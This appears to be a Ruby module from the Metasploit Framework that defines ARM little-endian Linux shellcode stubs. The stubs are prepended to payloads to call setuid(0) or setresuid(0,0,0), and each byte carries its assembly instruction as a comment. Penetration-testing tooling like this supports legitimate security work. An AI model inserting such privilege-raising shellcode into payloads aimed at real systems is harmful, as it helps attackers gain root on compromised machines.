#
# Linux armle prepends
#
module Msf::Payload::Linux::Armle::Prepends
  include Msf::Payload::Linux::Prepends

  def prepends_order
    %w[PrependSetresuid PrependSetuid]
  end

  def appends_order
    %w[]
  end

  def prepends_map
    {
      # 'PrependFork' =>  "",

      #
      # setuid(0)
      'PrependSetuid' => "\x00\x00\x20\xe0" + #    eor r0, r0, r0                    #
        "\x17\x70\xa0\xe3" + #    mov r7, #23                       #
        "\x00\x00\x00\xef", #    svc                               #

      # setresuid(0, 0, 0)
      'PrependSetresuid' => "\x00\x00\x20\xe0" + #    eor r0, r0, r0                    #
        "\x01\x10\x21\xe0" + #    eor r1, r1, r1                    #
        "\x02\x20\x22\xe0" + #    eor r2, r2, r2                    #
        "\xa4\x70\xa0\xe3" + #    mov r7, #0xa4                     #
        "\x00\x00\x00\xef" #    svc                               #
    }
  end

  def appends_map
    {}
  end
end
